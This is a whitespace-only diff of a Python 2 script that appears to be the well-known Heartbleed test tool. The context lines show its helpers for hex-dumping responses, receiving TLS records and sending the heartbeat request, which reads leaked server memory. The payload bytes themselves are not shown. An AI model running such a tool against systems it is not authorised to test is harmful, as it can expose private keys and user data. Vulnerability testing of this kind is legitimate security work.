@@ -49,7 +49,7 @@ def hexdump(s):
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
         print '  %04x: %-48s %s' % (b, hxdat, pdat)
     print
- 
+
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
     rdata = ''
@@ -67,8 +67,7 @@ def recvall(s, length, timeout=5):
             rdata += data
             remain -= len(data)
     return rdata
-        
- 
+
 def recvmsg(s):
     hdr = recvall(s, 5)
     if hdr is None:
@@ -81,7 +80,7 @@ def recvmsg(s):
         return None, None, None
     print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
     return typ, ver, pay
- 
+
 def hit_hb(s):
     s.send(hb)
     while True:
@@ -104,7 +103,7 @@ def hit_hb(s):
             hexdump(pay)
             print 'Server returned error, likely not vulnerable'
             return False
- 
+
 def main():
     opts, args = options.parse_args()
     if len(args) < 1:
@@ -147,6 +146,6 @@ def main():
     sys.stdout.flush()
     #s.send(hb)
     hit_hb(s)
- 
+
 if __name__ == '__main__':
     main()
